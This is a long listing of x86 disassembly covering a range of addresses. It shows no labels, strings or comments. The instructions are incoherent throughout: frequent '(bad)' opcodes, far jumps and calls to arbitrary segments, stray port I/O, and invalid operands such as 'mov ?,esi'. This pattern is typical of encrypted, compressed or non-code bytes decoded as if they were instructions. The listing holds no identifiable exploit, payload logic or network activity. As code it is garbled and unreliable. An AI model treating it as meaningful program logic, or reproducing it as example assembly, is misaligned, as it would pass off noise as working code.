  418968:	pop    eax
  418969:	jmp    0xfc9e:0x6aaa5605
  418970:	fisubr WORD PTR [ecx]
  418972:	jp     0x418942
  418974:	iret   
  418975:	arpl   WORD PTR [ebp-0x64],sp
  418978:	cmp    bl,BYTE PTR [ecx]
  41897a:	ret    0x3f43
  41897d:	into   
  41897e:	push   0xb9dc754b
  418983:	retf   0x88e0
  418986:	push   0xffffffa9
  418988:	push   eax
  418989:	jmp    0x4189e8
  41898b:	mov    ds:0xcdf0ca8a,al
  418990:	mov    ah,0x8d
  418992:	jbe    0x4189a3
  418994:	cmp    ebp,DWORD PTR [ebx-0x1d]
  418997:	dec    edx
  418998:	fadd   st,st(6)
  41899a:	jge    0x4189a9
  41899c:	gs je  0x4189b2
  41899f:	jo     0x4189f1
  4189a1:	test   BYTE PTR [edi+ebp*1],0x81
  4189a5:	retf   
  4189a6:	(bad)  
  4189a7:	ss popf 
  4189a9:	and    bh,dl
  4189ab:	and    al,0x51
  4189ad:	ror    BYTE PTR [ebx],cl
  4189af:	sbb    al,0xef
  4189b1:	jge    0x418991
  4189b3:	xor    ah,al
  4189b5:	in     al,0x20
  4189b7:	jmp    0x4189c8
  4189b9:	aad    0x10
  4189bb:	sbb    al,0x3d
  4189bd:	ja     0x4189ef
  4189bf:	pop    esp
  4189c0:	mov    ecx,0x83
	...
  418a31:	add    BYTE PTR [eax],al
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	jbe    0x418a98
  418a42:	sbb    eax,DWORD PTR [edi+0x10bfc]
  418a48:	test   BYTE PTR [eax],0x0
  418a4b:	add    cl,ah
  418a4d:	xor    ecx,DWORD PTR [ecx-0x6f81fa58]
  418a53:	sub    eax,0x2a5acb13
  418a58:	imul   ecx,DWORD PTR [esi+ecx*1+0x5e],0x4c
  418a5d:	shr    DWORD PTR [ebp+0x50],1
  418a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a61:	scas   al,BYTE PTR es:[edi]
  418a62:	ret    0x8ca8
  418a65:	jbe    0x418ad7
  418a67:	mov    al,0x64
  418a69:	or     DWORD PTR [edx],edi
  418a6b:	mov    eax,0x7e173d14
  418a70:	out    dx,al
  418a71:	pop    ebp
  418a73:	rcl    BYTE PTR [edx-0x727df9e7],1
  418a79:	jmp    0xbbfb:0x485622b8
  418a80:	adc    DWORD PTR [esi+0x5c],edx
  418a83:	lods   eax,DWORD PTR ds:[esi]
  418a84:	aaa    
  418a85:	jecxz  0x418ad2
  418a87:	scas   eax,DWORD PTR es:[edi]
  418a88:	test   eax,0x3c4b3ba8
  418a8d:	push   edx
  418a8e:	(bad)  
  418a8f:	mov    ds:0x12800656,al
  418a94:	ret    
  418a95:	mov    bh,0x1c
  418a97:	mov    dh,bl
  418a99:	mov    ch,0x53
  418a9b:	push   ds
  418a9c:	xor    eax,0xa2451cd
  418aa1:	imul   esi,DWORD PTR [esi],0x26
  418aa4:	test   esp,0xa67e241a
  418aaa:	add    al,0x71
  418aac:	sbb    dl,BYTE PTR [ebp-0x66]
  418aaf:	rcl    BYTE PTR [ecx-0x1f],cl
  418ab2:	shr    DWORD PTR [eax-0x3ebcafcf],cl
  418ab8:	inc    ebp
  418ab9:	sar    DWORD PTR [ecx],0xf9
  418abc:	inc    esp
  418abd:	retf   0x23f8
  418ac0:	out    dx,al
  418ac1:	push   edi
  418ac2:	addr16 cli 
  418ac4:	pop    edx
  418ac5:	cs xchg edx,eax
  418ac7:	rcl    BYTE PTR [esi+0x2743bd52],1
  418acd:	aad    0xb3
  418acf:	mov    al,0xd2
  418ad1:	fidiv  WORD PTR [edx+eax*1]
  418ad4:	arpl   bx,dx
  418ad6:	enter  0x1231,0x86
  418ada:	mov    ecx,0x7f4314b6
  418adf:	daa    
  418ae0:	retf   
  418ae1:	dec    ebx
  418ae2:	leave  
  418ae3:	dec    ebp
  418ae4:	jnp    0x418a6c
  418ae6:	add    dl,BYTE PTR [ebp+0x6b]
  418ae9:	mov    al,bh
  418aeb:	pop    ebx
  418aec:	mov    al,ds:0xd2eac77c
  418af1:	into   
  418af2:	mov    esp,0xdb2b5d3f
  418af7:	js     0x418af6
  418af9:	cmp    BYTE PTR [ebp+0x5ea98b09],0x38
  418b00:	mov    eax,ebx
  418b02:	out    dx,eax
  418b03:	(bad)  
  418b04:	(bad)  
  418b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b06:	int3   
  418b07:	inc    eax
  418b08:	fs out 0x18,eax
  418b0b:	add    BYTE PTR [ebp-0x698afed7],ch
  418b11:	mov    ?,esi
  418b13:	adc    esp,DWORD PTR [ebp+0x38]
  418b16:	outs   dx,DWORD PTR ds:[esi]
  418b18:	jo     0x418b25
  418b1a:	mov    esp,0x2b13efa3
  418b1f:	pop    es
  418b20:	mov    edi,DWORD PTR [ecx]
  418b22:	pop    esp
  418b23:	xor    dl,BYTE PTR [esi]
  418b25:	xchg   DWORD PTR [ecx],esi
  418b27:	mov    esi,0xe0f7373a
  418b2c:	cmp    esi,esi
  418b2e:	xchg   esi,eax
  418b2f:	nop
  418b30:	call   0x6c1d:0x4bf923ee
  418b37:	mov    ds,WORD PTR [ecx+eax*4]
  418b3a:	sub    DWORD PTR [ebx],ecx
  418b3c:	int3   
  418b3d:	add    bh,BYTE PTR [ebx+0x74]
  418b40:	jecxz  0x418ae8
	...
  418bb2:	add    BYTE PTR [eax],al
  418bb4:	mov    eax,eax
  418bb6:	nop
  418bb7:	test   cl,bl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	je     0x418c0f
  418bc2:	xchg   ecx,eax
  418bc3:	sub    eax,0x10cf2
  418bc8:	test   BYTE PTR [eax],0x0
  418bcb:	add    BYTE PTR [ecx+0x24fd40b9],ah
  418bd1:	xchg   BYTE PTR [edi],cl
  418bd3:	sti    
  418bd4:	inc    ebp
  418bd5:	outs   dx,DWORD PTR ds:[esi]
  418bd6:	dec    eax
  418bd7:	bsf    edi,DWORD PTR ds:0x828fb5c
  418bde:	push   ss
  418bdf:	or     BYTE PTR [eax-0x4a],0xd6
  418be3:	popf   
  418be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be5:	jmp    0x4c57:0xf5e96f84
  418bec:	ret    
  418bed:	sub    al,0x96
  418bef:	idiv   esi
  418bf1:	mov    bl,0x91
  418bf3:	or     eax,0x29a23387
  418bf8:	bound  ebp,QWORD PTR [edi+0x1ad968b4]
  418bfe:	xchg   ebp,eax
  418bff:	test   BYTE PTR [edx],al
  418c01:	push   ecx
  418c02:	xchg   edx,eax
  418c03:	aaa    
  418c04:	aaa    
  418c05:	xlat   BYTE PTR ds:[ebx]
  418c06:	sti    
  418c07:	iret   
  418c08:	outs   dx,DWORD PTR ds:[esi]
  418c09:	out    0x57,al
  418c0b:	pop    es
  418c0c:	adc    esi,DWORD PTR [ecx]
  418c0e:	(bad)  
  418c0f:	add    esi,DWORD PTR [ebx+esi*8+0x461b2ff8]
  418c16:	jmp    0x418bf4
  418c18:	imul   esp,DWORD PTR [edx-0x47],0xfffffff3
  418c1c:	or     dl,BYTE PTR [edi]
  418c1e:	ror    BYTE PTR [esi-0x54aadfe9],1
  418c24:	out    dx,al
  418c25:	das    
  418c26:	push   edi
  418c27:	pop    edi
  418c28:	mov    edi,0x569a21c6
  418c2d:	cli    
  418c2e:	lds    eax,FWORD PTR [esi+0x6c]
  418c31:	mov    BYTE PTR [ebx+0x23],ah
  418c34:	hlt    
  418c35:	jns    0x418bcb
  418c37:	inc    eax
  418c38:	xchg   esi,eax
  418c39:	aaa    
  418c3a:	add    bl,BYTE PTR [ecx+0x1b6380a3]
  418c40:	jmp    0xb4b4636b
  418c45:	(bad)  
  418c46:	dec    ebx
  418c47:	shl    BYTE PTR [esi-0x43],1
  418c4a:	lock and esp,ecx
  418c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4e:	outs   dx,BYTE PTR ds:[esi]
  418c4f:	mov    ebx,0x1833b0d7
  418c54:	push   edx
  418c55:	fld    QWORD PTR [ebp+ebx*4-0x753ebd2c]
  418c5c:	ins    BYTE PTR es:[edi],dx
  418c5d:	adc    eax,0xb2c781e1
  418c62:	add    eax,0x1ca46a87
  418c67:	mov    edi,0x9fb389b7
  418c6c:	jge    0x418c58
  418c6e:	scas   al,BYTE PTR es:[edi]
  418c6f:	aas    
  418c70:	mov    bh,0xb4
  418c72:	cmp    al,0x50
  418c74:	adc    al,0x1d
  418c76:	xchg   edx,eax
  418c77:	jae    0x418ca9
  418c79:	jge    0x418c4a
  418c7b:	pop    esi
  418c7c:	add    BYTE PTR [ecx+edi*2],ah
  418c7f:	mov    ds:0x402f3059,al
  418c84:	nop
  418c85:	mov    BYTE PTR [eax+0x6541a5ee],0xf1
  418c8c:	push   cs
  418c8d:	daa    
  418c8e:	inc    ecx
  418c8f:	js     0x418c57
  418c91:	into   
  418c92:	inc    edi
  418c93:	iret   
  418c94:	pop    ss
  418c95:	mov    edx,0x2a2920da
  418c9a:	shr    DWORD PTR [edi],0x41
  418c9d:	inc    edi
  418c9e:	cmp    al,0xd6
  418ca0:	inc    esp
  418ca1:	dec    ebp
  418ca2:	lock add edx,DWORD PTR [ebp+ecx*2-0x2d]
  418ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca8:	fidivr DWORD PTR [eax-0x72782e58]
  418cae:	inc    ebx
  418caf:	pop    ss
  418cb0:	ds aas 
  418cb2:	adc    BYTE PTR [eax-0x62],bh
  418cb5:	inc    ebp
  418cb6:	aaa    
  418cb7:	push   esi
  418cb8:	xchg   ecx,eax
  418cb9:	or     esp,edi
  418cbb:	daa    
  418cbc:	xchg   ecx,eax
  418cbd:	jmp    0x418c43
  418cbf:	lods   eax,DWORD PTR ds:[esi]
  418cc0:	push   ds
  418cc1:	jmp    0x418cc3
	...
  418d33:	add    BYTE PTR [edi],dl
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0xc3530761
  418d43:	mov    esp,0x10de8
  418d48:	test   BYTE PTR [eax],0x0
  418d4b:	add    BYTE PTR [ebp-0xf87f556],ch
  418d51:	push   ecx
  418d52:	mov    edx,ebx
  418d54:	cmovl  edi,DWORD PTR [ebp-0x2d9f3ce1]
  418d5b:	cmp    al,0x35
  418d5d:	aas    
  418d5e:	adc    eax,0xc8ac9f04
  418d63:	out    dx,eax
  418d64:	lods   eax,DWORD PTR ds:[esi]
  418d65:	jae    0x418d3a
  418d67:	cld    
  418d68:	pushf  
  418d69:	mov    eax,ds:0x79233c7d
  418d6e:	and    al,0x59
  418d70:	push   ebp
  418d71:	ficomp WORD PTR [esi+ebx*1+0x54]
  418d75:	cwde   
  418d76:	and    ecx,DWORD PTR [ecx-0x1c]
  418d79:	gs cmp bh,dl
  418d7c:	mov    ds:0x64c922b5,al
  418d81:	inc    esp
  418d82:	push   es
  418d83:	mov    ah,0xf
  418d85:	enter  0x9ac7,0x8b
  418d89:	fild   WORD PTR [ebx+0x4aa77acb]
  418d8f:	cli    
  418d90:	cwde   
  418d91:	sbb    dl,ch
  418d93:	call   DWORD PTR [esi+eax*8-0x3]
  418d97:	sub    dh,BYTE PTR [edx*1+0x7d127306]
  418d9e:	pushf  
  418d9f:	and    al,0x8d
  418da1:	jmp    0xb46e:0x1c26b32
  418da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da9:	pop    ebx
  418daa:	fsubp  st(5),st
  418dac:	mov    ch,0xe5
  418dae:	and    BYTE PTR [eax-0xf0033bb],cl
  418db4:	cmp    DWORD PTR [eax],ecx
  418db6:	cmp    bl,bl
  418db8:	loopne 0x418d97
  418dba:	nop
  418dbb:	cmp    ch,bh
  418dbd:	mov    WORD PTR [esi+0x65],ss
  418dc0:	push   esp
  418dc1:	(bad)
  418dc5:	in     eax,0xf9
  418dc7:	adc    eax,DWORD PTR [edx+0x2e]
  418dca:	les    esi,FWORD PTR [ebp-0x57c0a71d]
  418dd0:	sbb    BYTE PTR [ebp-0x13],al
  418dd3:	inc    ebx
  418dd4:	or     DWORD PTR [edi-0x73529910],0xffffffe3
  418ddb:	xchg   edi,eax
  418ddc:	ins    DWORD PTR es:[edi],dx
  418ddd:	shl    BYTE PTR [esi-0x13],cl
  418de0:	jg     0x418d6e
  418de2:	popf   
  418de3:	xchg   esi,eax
  418de4:	jno    0x418e3e
  418de6:	fisttp DWORD PTR [edx+ecx*2]
  418de9:	dec    eax
  418dea:	adc    eax,0x4d215447
  418def:	stc    
  418df0:	scas   al,BYTE PTR es:[edi]
  418df1:	test   eax,0xf493db4f
  418df6:	sahf   
  418df7:	jp     0x418db2
  418df9:	dec    ecx
  418dfa:	mov    al,ds:0xf7a293c5
  418dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e00:	pusha  
  418e01:	or     bh,cl
  418e03:	mov    dh,0xad
  418e05:	arpl   WORD PTR [edi+0x39c15ab],dx
  418e0b:	shl    DWORD PTR [ecx+0x53],0xec
  418e0f:	pusha  
  418e10:	pop    edi
  418e11:	outs   dx,DWORD PTR ds:[esi]
  418e12:	cmp    ebx,DWORD PTR [ebp-0x231389e5]
  418e18:	loope  0x418e16
  418e1a:	aad    0xea
  418e1c:	xor    dh,bl
  418e1e:	pop    edx
  418e1f:	mov    al,0x29
  418e21:	aas    
  418e22:	in     eax,0x9e
  418e24:	mov    edi,0xc55b0375
  418e29:	pusha  
  418e2a:	ins    DWORD PTR es:[edi],dx
  418e2b:	into   
  418e2c:	add    al,0xf7
  418e2e:	jo     0x418db1
  418e30:	outs   dx,BYTE PTR ds:[esi]
  418e31:	fistp  DWORD PTR [eax-0x7b]
  418e34:	fdivr  QWORD PTR [esi-0x5b5ba987]
  418e3a:	sbb    BYTE PTR [edi],bl
  418e3c:	das    
  418e3d:	out    0x92,al
  418e3f:	sub    al,0xfc
  418e41:	jns    0x418e43
	...
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	add    al,0x78
  418ec2:	xchg   esp,eax
  418ec3:	adc    esi,ebx
  418ec5:	push   cs
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	test   BYTE PTR [eax],0x0
  418ecb:	add    BYTE PTR ds:0x61dba24b,ch
  418ed1:	mov    ch,0xb7
  418ed3:	aas    
  418ed4:	(bad)  
  418ed5:	pop    esi
  418ed6:	or     eax,0xe26feac0
  418edb:	test   al,0x38
  418edd:	in     al,dx
  418ede:	fnsave [edx+0x24]
  418ee1:	cmp    eax,DWORD PTR [eax-0x589ec8f6]
  418ee7:	(bad)  
  418ee8:	lock mov esi,0x3d4cbd
  418eee:	or     BYTE PTR [ecx+0x2a596d8c],ch
  418ef4:	lods   eax,DWORD PTR ds:[esi]
  418ef5:	add    BYTE PTR [eax-0x4ffdab57],dh
  418efb:	ds inc ebx
  418efd:	nop
  418efe:	(bad)  
  418f00:	fs xor eax,ebp
  418f03:	xchg   al,dh
  418f05:	or     eax,0x96211936
  418f0a:	mov    WORD PTR [ecx],fs
  418f0c:	add    bh,BYTE PTR [esi+0x5709b069]
  418f12:	jnp    0x418f47
  418f14:	sbb    al,0xdd
  418f16:	sti    
  418f17:	add    bl,BYTE PTR [edx-0x74]
  418f1a:	lahf   
  418f1b:	inc    edx
  418f1c:	fistp  DWORD PTR [ebx+eiz*2+0x3175df5b]
  418f23:	inc    ebx
  418f24:	jecxz  0x418f40
  418f26:	jns    0x418f11
  418f28:	ficomp WORD PTR [ebp+0x40]
  418f2b:	loop   0x418fac
  418f2d:	repz out 0x2b,al
  418f30:	into   
  418f31:	in     al,dx
  418f32:	add    edx,ebp
  418f34:	adc    BYTE PTR [esi*1-0x49a079ee],0xbd
  418f3c:	popa   
  418f3d:	pop    ds
  418f3e:	(bad)  
  418f40:	pop    edi
  418f41:	mov    bh,0xea
  418f43:	mov    ecx,0xafed4b4d
  418f48:	and    eax,0x803b7a66
  418f4d:	leave  
  418f4e:	aaa    
  418f4f:	lea    edx,[ebx]
  418f51:	xor    bl,BYTE PTR [eax]
  418f53:	rcr    dh,0xac
  418f56:	pop    ds
  418f57:	clc    
  418f58:	(bad)  
  418f59:	mov    edx,0x4afeba14
  418f5e:	jmp    0x2a7b5644
  418f63:	aaa    
  418f64:	into   
  418f65:	(bad)  
  418f66:	jecxz  0x418f41
  418f68:	pop    edx
  418f69:	or     eax,0x13dccfc6
  418f6e:	mov    dh,0xbc
  418f70:	imul   esp,DWORD PTR [eax],0x4e
  418f73:	pop    edi
  418f74:	faddp  st(1),st
  418f76:	sub    bh,BYTE PTR [eax]
  418f78:	jp     0x418f18
  418f7a:	mov    edi,0x8c9eefbe
  418f7f:	aas    
  418f80:	push   edi
  418f81:	mov    dl,0x4c
  418f83:	jmp    0xb61e:0xbe8fe3fa
  418f8a:	aas    
  418f8b:	pop    ebp
  418f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f8d:	arpl   WORD PTR [ecx-0x6b889802],bp
  418f93:	inc    esp
  418f94:	push   0xf3ed5ce6
  418f99:	xor    DWORD PTR [ebx+0x5a22283d],esi
  418f9f:	repz xchg ecx,eax
  418fa1:	sahf   
  418fa2:	dec    ecx
  418fa3:	dec    esp
  418fa4:	mov    al,ds:0x4a2972de
  418fa9:	xlat   BYTE PTR ds:[ebx]
  418faa:	repz scas eax,DWORD PTR es:[edi]
  418fac:	in     al,0x2c
  418fae:	push   edx
  418faf:	push   0x15ecce69
  418fb4:	jge    0x418f9f
  418fb6:	sbb    al,0x54
  418fb8:	cdq    
  418fb9:	sub    eax,0x10e33358
  418fbe:	push   esi
  418fbf:	dec    eax
  418fc0:	in     eax,dx
  418fc1:	xchg   BYTE PTR [eax],al
	...
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	sar    bh,cl
  419041:	lahf   
  419042:	mov    bl,0x5f
  419044:	aam    0xf
  419046:	add    DWORD PTR [eax],eax
  419048:	test   BYTE PTR [eax],0x0
  41904b:	add    BYTE PTR [ecx+0x5b1f38de],dl
  419051:	sbb    eax,0xb24aeaa8
  419056:	leave  
  419057:	cli    
  419058:	pushf  
  419059:	leave  
  41905a:	stc    
  41905b:	out    0xb1,al
  41905d:	jp     0x418fe8
  41905f:	out    0x6f,eax
  419061:	mov    ecx,DWORD PTR [ebp+0x52034229]
  419067:	inc    esi
  419068:	add    cl,ah
  41906a:	lock xor esp,DWORD PTR [ebx-0x7166efe8]
  419071:	push   edi
  419072:	rcl    BYTE PTR [edx+0x76515445],0xb1
  419079:	sub    eax,0xfb63594d
  41907e:	lea    ecx,[ebx+0x220fe562]
  419084:	stos   DWORD PTR es:[edi],eax
  419085:	xchg   ecx,eax
  419086:	xchg   esp,eax
  419087:	(bad)  
  419088:	push   esi
  419089:	and    BYTE PTR [edi],dh
  41908b:	ret    0xab61
  41908e:	dec    ebx
  41908f:	push   eax
  419090:	add    DWORD PTR [esi],esp
  419092:	xor    eax,eax
  419094:	call   0x6bb8:0x341dd4d5
  41909b:	mov    esp,0x665968e1
  4190a0:	hlt    
  4190a1:	in     al,0x14
  4190a3:	enter  0x3327,0x69
  4190a7:	pushf  
  4190a8:	mov    esp,0xdbcff680
  4190ad:	mov    eax,0x5aee6b09
  4190b2:	out    dx,al
  4190b3:	mov    DWORD PTR ds:0xb3781403,esp
  4190b9:	sbb    al,0xf0
  4190bb:	or     cl,BYTE PTR [ebx]
  4190bd:	dec    eax
  4190be:	shl    dl,0x79
  4190c1:	(bad)  
  4190c3:	mov    ecx,0xf8137772
  4190c8:	ret    
  4190c9:	push   ecx
  4190ca:	ficom  DWORD PTR [esi]
  4190cc:	sbb    DWORD PTR [eax-0x7a],esi
  4190cf:	imul   edi,DWORD PTR [esi-0x32ed0151],0xffffffb1
  4190d6:	retf   0x659f
  4190d9:	je     0x41911d
  4190db:	adc    BYTE PTR [eax],ah
  4190dd:	mov    ds,ebx
  4190df:	ror    dh,1
  4190e1:	pop    ds
  4190e2:	inc    ebx
  4190e3:	pop    es
  4190e4:	iret   
  4190e5:	shl    ebx,1
  4190e7:	cmc    
  4190e8:	daa    
  4190e9:	jmp    0x4190f0
  4190eb:	sti    
  4190ec:	in     al,0xa6
  4190ee:	sti    
  4190ef:	sar    bh,0x15
  4190f2:	cli    
  4190f3:	and    cl,BYTE PTR [edi+0x592aa3fb]
  4190f9:	fwait
  4190fa:	sbb    al,0x24
  4190fc:	repz adc dl,BYTE PTR [ecx]
  4190ff:	or     ebp,DWORD PTR [esi]
  419101:	(bad)  
  419102:	aad    0xaf
  419104:	push   edi
  419105:	pushf  
  419106:	adc    eax,0xdd3f0ca5
  41910b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41910c:	add    eax,0xbac09eeb
  419111:	enter  0x1935,0xb8
  419115:	mov    esp,0x717641d7
  41911a:	adc    al,0xb4
  41911c:	or     ebp,esp
  41911e:	inc    ebx
  41911f:	fsubr  QWORD PTR [edi-0x13369406]
  419125:	lock ins BYTE PTR es:[edi],dx
  419127:	repnz sbb cl,BYTE PTR [eax+0x474319b7]
  41912e:	adc    bh,BYTE PTR [ebp-0x73]
  419131:	mov    ebp,0xf9cd159f
  419136:	pop    edx
  419137:	cmp    DWORD PTR [ebx+0x52ec1697],esp
  41913d:	mov    BYTE PTR [ebx],bh
  41913f:	and    eax,0xd83c
	...
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	sbb    ebx,ebp
  4191c2:	xor    al,0xf0
  4191c4:	retf   0x110
  4191c7:	add    dh,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [eax],al
  4191cd:	mov    bl,0x6
  4191cf:	int    0x75
  4191d1:	sbb    edx,eax
  4191d3:	pop    esp
  4191d4:	into   
  4191d5:	mov    ecx,0xbfdd1bed
  4191da:	pusha  
  4191db:	or     bh,0x8f
  4191de:	pop    eax
  4191df:	(bad)  
  4191e0:	addr16 not ebp
  4191e3:	aaa    
  4191e4:	ror    cl,cl
  4191e6:	rol    BYTE PTR [ecx],0x2c
  4191e9:	push   esp
  4191ea:	fldcw  WORD PTR [esi+ebp*4+0x1a]
  4191ee:	in     al,0x8e
  4191f0:	pop    ss
  4191f1:	lea    esp,[ebx-0x1a32776d]
  4191f7:	cmc    
  4191f8:	pushf  
  4191f9:	xchg   dh,cl
  4191fb:	ret    
  4191fc:	fdivr  QWORD PTR [bx-0x2a20]
  419201:	jo     0x419217
  419203:	pop    eax
  419204:	mov    eax,0xd691438
  419209:	outs   dx,DWORD PTR ds:[esi]
  41920a:	adc    esi,DWORD PTR [edx+0x12]
  41920d:	mov    dl,0xf1
  41920f:	push   ebp
  419210:	cs pop edi
  419212:	mov    ah,0x6c
  419214:	cld    
  419215:	adc    eax,0x33b97c50
  41921a:	mov    edx,0x71358c54
  41921f:	leave  
  419220:	pop    ss
  419221:	push   cs
  419222:	mov    ds:0x7e563a20,al
  419227:	jns    0x41923d
  419229:	rol    DWORD PTR [ecx+0x7e],0x7d
  41922d:	lea    eax,[edi*4+0x2bd46fb]
  419234:	loope  0x419238
  419236:	sub    eax,0xef53cf7d
  41923b:	jno    0x4191de
  41923d:	mov    tr4,eax
  419240:	and    dl,BYTE PTR [eax+edi*2+0x74]
  419244:	or     bh,dh
  419246:	ss mov dl,0x6d
  419249:	jnp    0x419204
  41924b:	into   
  41924c:	cdq    
  41924d:	out    0x74,eax
  41924f:	jl     0x41927f
  419251:	shl    BYTE PTR [esi+0xa],0x69
  419255:	dec    edx
  419256:	fcomp  QWORD PTR [eax+0x66feb3b5]
  41925c:	add    BYTE PTR [eax],ch
  41925e:	pop    ds
  41925f:	lahf   
  419260:	and    BYTE PTR [edi+0x3e],0x1e
  419264:	and    ecx,DWORD PTR [esi+ebp*8]
  419267:	xchg   ecx,eax
  419268:	mov    ah,BYTE PTR [esp+edi*4+0x2b]
  41926c:	mov    edx,0xa433d711
  419271:	aad    0x2a
  419273:	repz mov cl,0xe6
  419276:	les    edx,FWORD PTR [ebp-0xf]
  419279:	xchg   ebp,eax
  41927a:	fadd   st,st(4)
  41927c:	fstp   DWORD PTR [ebx-0x58]
  41927f:	aad    0x86
  419281:	cmp    eax,0x7ecdd516
  419286:	(bad)  
  419287:	pop    esi
  419288:	dec    eax
  419289:	int    0xf0
  41928b:	int3   
  41928c:	sbb    BYTE PTR [ebp+0x75b3f38b],bh
  419292:	scas   eax,DWORD PTR es:[edi]
  419293:	mov    WORD PTR [esi-0x246127cd],es
  419299:	outs   dx,BYTE PTR ds:[esi]
  41929a:	mov    BYTE PTR [eax+0x77],al
  41929d:	sar    eax,0xb
  4192a0:	or     al,0xff
  4192a2:	push   0xffffffe0
  4192a4:	mov    WORD PTR [edx],?
  4192a6:	and    al,0xda
  4192a8:	(bad)  
  4192a9:	clc    
  4192aa:	jmp    0x41930d
  4192ac:	adc    ecx,DWORD PTR [edi+0x5d8ae6da]
  4192b2:	hlt    
  4192b3:	mov    esi,0x6c24e4
  4192b8:	xor    ah,ah
  4192ba:	imul   esi,DWORD PTR [edx-0x203ab746],0xf9b2
	...
  419334:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	dec    ebx
  419341:	and    DWORD PTR [ebx],ebx
  419343:	xor    al,al
  419345:	adc    DWORD PTR [ecx],eax
  419347:	add    dh,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [edx-0x1a5a5fba],bh
  419351:	lods   eax,DWORD PTR ds:[esi]
  419352:	retf   
  419353:	mov    dl,0xe6
  419355:	fnstsw WORD PTR [edx-0x1b3bf45]
  41935b:	add    al,BYTE PTR [edi+0x50]
  41935e:	cmp    edx,edi
  419360:	aad    0x50
  419362:	ret    
  419363:	in     eax,0x4e
  419365:	(bad)  
  419366:	rdtsc  
  419368:	repnz and bh,dh
  41936b:	inc    ebx
  41936c:	pop    esi
  41936d:	add    ch,dh
  41936f:	add    eax,0xa51eb27e
  419374:	in     eax,dx
  419375:	scas   al,BYTE PTR es:[edi]
  419376:	mov    edi,0x267e1da3
  41937b:	retf   
  41937c:	mov    edi,0x5f97a57c
  419381:	ret    0x177c
  419384:	xchg   ecx,eax
  419385:	mov    bl,0xb4
  419387:	cmp    al,0x6a
  419389:	dec    ecx
  41938a:	in     eax,dx
  41938b:	sbb    DWORD PTR fs:[esi-0x79],eax
  41938f:	imul   ecx,edx,0xf08c7323
  419395:	mov    dl,BYTE PTR [esi+0x68]
  419398:	daa    
  419399:	sar    al,1
  41939b:	into   
  41939c:	and    dh,BYTE PTR [edi]
  41939e:	out    dx,eax
  41939f:	loopne 0x419364
  4193a1:	xor    eax,0x9d2caea1
  4193a6:	stc    
  4193a7:	mov    ecx,DWORD PTR [ecx]
  4193a9:	jp     0x419362
  4193ab:	hlt    
  4193ac:	out    dx,al
  4193ad:	pop    eax
  4193ae:	fs dec si
  4193b1:	push   ss
  4193b2:	call   0x315f58ac
  4193b7:	xchg   DWORD PTR [ecx+ebp*2],ebx
  4193ba:	adc    edx,ebx
  4193bc:	pop    ecx
  4193bd:	pop    ecx
  4193be:	popf   
  4193bf:	addr16 jl 0x4193c7
  4193c2:	lock mov ebx,DWORD PTR [edx-0x62ee712c]
  4193c9:	lea    ebp,[edx]
  4193cb:	mov    bh,BYTE PTR [eax+0x16]
  4193ce:	mov    ds:0x833ff1d3,al
  4193d3:	mov    dh,0xc1
  4193d5:	xor    BYTE PTR [eax+0x39],ah
  4193d8:	mov    ?,WORD PTR cs:0xcd80c8f7
  4193df:	fnstsw WORD PTR [eax+0x58]
  4193e2:	pop    ss
  4193e3:	xor    al,0x74
  4193e5:	add    dh,BYTE PTR [ebx]
  4193e7:	shr    DWORD PTR [esi+esi*4+0x65],1
  4193eb:	fdiv   DWORD PTR [esp+eiz*8]
  4193ee:	jl     0x4193ab
  4193f0:	das    
  4193f1:	adc    DWORD PTR ds:0xbcb0892d,esi
  4193f7:	fstp   DWORD PTR [esi]
  4193f9:	ficom  WORD PTR [edi-0x72]
  4193fc:	cmp    BYTE PTR ds:0x339acbf9,bl
  419402:	add    eax,0xe2502461
  419407:	into   
  419408:	sbb    al,0x3d
  41940a:	hlt    
  41940b:	mov    ecx,0xba01e90e
  419410:	out    dx,eax
  419411:	scas   al,BYTE PTR es:[edi]
  419412:	cmp    al,BYTE PTR [edx+0x76]
  419415:	xor    BYTE PTR [ebx],dh
  419417:	setno  BYTE PTR [ebp+0x6f]
  41941b:	jbe    0x419443
  41941d:	or     BYTE PTR [edx+0x125ca2d4],ch
  419423:	dec    ebp
  419424:	xlat   BYTE PTR ds:[ebx]
  419425:	or     BYTE PTR [ebx+0x1ccd0bcf],ah
  41942b:	icebp  
